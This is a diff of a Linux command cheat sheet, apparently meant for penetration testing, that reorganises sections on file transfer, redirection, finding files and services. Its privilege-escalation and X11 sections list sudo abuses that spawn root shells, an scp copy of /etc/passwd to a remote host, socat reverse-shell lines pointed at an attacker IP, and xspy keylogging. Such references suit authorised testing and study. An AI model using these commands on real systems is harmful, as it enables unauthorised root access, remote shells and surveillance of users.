@@ -7,12 +7,6 @@ echo "lee:password123#" | base64                Encode
 echo "bGVlOnBhc3N3b3JkMTIzIwo=" | base64 -d     Decode
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Boot time
-
-update-rc.d <service> enable                    Enable a service at boot time
-update-rc.d <service> disable                   Disable a service at boot time
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
 # Compile
 
 gcc test.c -o test                              Compile test
@@ -98,8 +92,17 @@ chmod 755 test.sh                               Make a file executable
 
 # File Transfer
 
+curl                                            Supports more protocols and APIs
+wget                                            No APIs, supports recursive download
+
+python3 -m http.server                          Starts a web sever on the default port 8000
 python3 -m http.server 80                       Starts a web sever on port 80
-curl 10.0.0.5/test.txt -o test.txt              Download a file
+
+curl 10.0.0.5/test.txt                          Dump a file to STDOUT
+curl -O 10.0.0.5/test.txt                       Download a file and keep the same filename
+curl 10.0.0.5/test.txt -o results.txt           Download a file and rename it
+wget 10.0.0.5/test.txt                          Download a file and keep the same filename
+wget 10.0.0.5/test.txt -O results.txt           Download a file and rename it
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Files & Directories
@@ -114,15 +117,11 @@ pwd                                             Print the current working direct
 
 touch tmp                                       Create a file
 mkdir tmp                                       Create a directory
-mkdir -p tmp/{red,white,blue}                   Create a directory with 3 subdirectories
+mkdir -p tmp/{red,white,blue}                   Create a directory with 3 sub directories
 
 cat tmp                                         Show the contents of a file
 more tmp                                        Show the contents of a file, a page at a time
                                                 Space bar for the next page or 'q' to quit
-
-ping targat.com > tmp                           Redirect output to a new file
-ping target2.com >> tmp                         Appending output to an existing file
-wc -m < tmp                                     Redirect STDIN from a file
 
 cp tmp tmp2                                     Copy a file from one location to another
 cp -r dir dir2                                  Copy a directory from one location to another
@@ -131,6 +130,20 @@ rm tmp                                          Delete a file
 rm -rf test                                     Force delete the directory
 
 ln -s /path/to/file /path/to/link               Create a symbolic link
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# File Descriptor
+
+STDIN – 0                                       Data stream for input
+STDOUT – 1                                      Data stream for output
+STDERR – 2                                      Data stream for output that relates to an error occurring
+
+find /etc/ -name shadow 2>/dev/null > tmp       Redirect STDOUT to a new file
+find /etc/ -name shadow 2> stderr.txt 1 > tmp   Redirect STDERR and STDOUT to separate new files
+
+ping targat.com > tmp                           Redirect STDOUT to a new file
+ping target2.com >> tmp                         Redirect STDOUT and append to a file
+wc -m < tmp                                     Redirect STDIN
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # File Integrity
@@ -142,15 +155,18 @@ sha256sum test.iso                              SHA256 hash
 
 # Finding Files
 
-locate file                                     Reads a database (locate.db) and shows the location of a file
-updatedb                                        Updates the db of all file names on the system
-which app                                       Path where the app is executed from
+which <file>                                    Path where a file is executed from
 
-find / -name pass*                              Find all the files that start with pass
-find / -name *pass                              Find all the files that end with pass
+- find                                          Contains many filters
+find / -type f -name pass* -user root 2>/dev/null        Find files that start with pass and owned by root
+find / -type f -name *.conf -size +100k 2>/dev/null      Find config files that are larger than 100 kb
+find / -type f -newermt 2020-03-03 2>/dev/null           Find files newer than 2020-03-03
+find / -type f -size -28k -size +25k 2>/dev/null         Find files less than 28kb and greater than 25 kb
+find / -type f -perm 0777 -print -exec chmod 644 {} \;   Find files with permission 777 and change to 644
 
-find / -user <user> 2>/dev/null                 All files owned by a particular user
-find / -group <group> 2>/dev/null               All files owned by a particular group
+- locate                                        Contains no filters
+updatedb                                        Updates the local database of all file and folder locations
+locate <file>                                   Searches a local database (locate.db) that contains information about existing files and folders
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Installation
@@ -160,9 +176,9 @@ make
 make install
 
 dpkg -i app.deb                                 Install Debian package
-rpm -vhU app.rpm                                Install RPM package
+dpkg --list | grep 'ii' | wc -l                 Total number of packages installed
 
-dpkg-query -l                                   Installed packages
+rpm -vhU app.rpm                                Install RPM package
 
 - CentOS
 yum -y install $(cat file)                      Install packages listed in a file
@@ -230,12 +246,12 @@ find / -perm -4000 2>/dev/null                             Binaries with the SUI
 find / -user root -perm -6000 -print 2>/dev/null           Binaries with the SGID bit set - run the file with permissions of the owner's group
 find / -perm -1000 2>/dev/null                             Binaries with the sticky bit set - only the owner of a directory or a file can delete or rename
 
-find / -perm -o+w -type f 2>/dev/null                      World-writeable files
-find / -writable -type d 2>/dev/null                       World-writeable folders
+find / -perm -o+w -type f 2>/dev/null                      World writable files
+find / -writable -type d 2>/dev/null                       World writable folders
 
-find / -perm -o+x -type f 2>/dev/null                      World-executable files
-find / -perm -o+x -type d 2>/dev/null                      World-executable folders
-find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null     World-writeable & world-executable folders
+find / -perm -o+x -type f 2>/dev/null                      World executable files
+find / -perm -o+x -type d 2>/dev/null                      World executable folders
+find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null     World writable & world executable folders
 
 - Enumeration scripts (suggested order)
 wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
@@ -259,9 +275,9 @@ id                                                         You should now have a
 
 - Abusing binaries
 sudo apache2 -f /etc/shadow                                A way to view a system file
-sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash -i"
-sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
-sudo apt-get changelog apt                                 !/bin/sh then hit enter
+sudo apt update -o APT::Update::Pre-Invoke::="/bin/bash -i"
+sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
+sudo apt changelog apt                                 !/bin/sh then hit enter
 sudo awk 'BEGIN {system("/bin/bash")}'
 sudo ed                                                    !/bin/sh then hit enter
 sudo env /bin/bash
@@ -282,7 +298,7 @@ sudo perl -e 'exec "/bin/bash";'
 sudo python -c 'import pty;pty.spawn("/bin/bash")'
 sudo scp /etc/passwd lee@10.0.0.5:~/
 
-socate file:`tty`,raw,echo=0 tcp-listen:443                Attack VM
+socat file:`tty`,raw,echo=0 tcp-listen:443                 Attack VM
 sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:<attack IP>:443
 
 sudo vi                                                    :!bash
@@ -316,10 +332,11 @@ What groups does the user belong to?
 
 # Processes
 
-ps fawwwux                                      Show all running processes
+ps fawwwux                                      Show running processes
 ps -ef | grep root                              Processes running as root
 ps -ef | grep -v root                           Processes running under another account besides root
-top                                             Running processes, CPU and memory
+jobs                                            Show background processes
+top                                             Running processes, CPU, and memory
 kill -9 <PID>                                   Kill process ID
 killall <service>                               Kill all processes named service
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -432,6 +449,17 @@ ctrl+a esc                                      Use the up and down arrows or mo
 esc                                             Exit scrollback mode
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
+# Services
+
+systemctl list-units --type=service             List all services
+
+systemctl <start/stop/restart/status> <service>
+systemctl enable <service>                      Enable a service at boot time
+
+update-rc.d <service> enable                    Enable a service at boot time
+update-rc.d <service> disable                   Disable a service at boot time
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
 # SMB
 
 cd /etc/samba/
@@ -511,14 +539,6 @@ ssh -X user@host -o "XAuthLocation=/opt/X11/bin/xauth"
 xdg-open                                        Start a GUI app
 
 Note: if using macOS as the client, install XQuartz.
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-# Startup Services
-
-update-rc.d -f <service> <add/remove>
-
-update-rc.d networking defaults
-/etc/init.d/networking restart
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # System
@@ -778,7 +798,7 @@ convert 1.xwd 1.png
 
 - Keylogger
 xspy -display <target IP:display #>
-If Kali's version doesnot work, you may need to compile from source https://github.com/mnp/xspy
+If Kali's version does not work, you may need to compile from source https://github.com/mnp/xspy
 
 - Remotely view
 xwatchwin <target IP:display #> -w <ID>
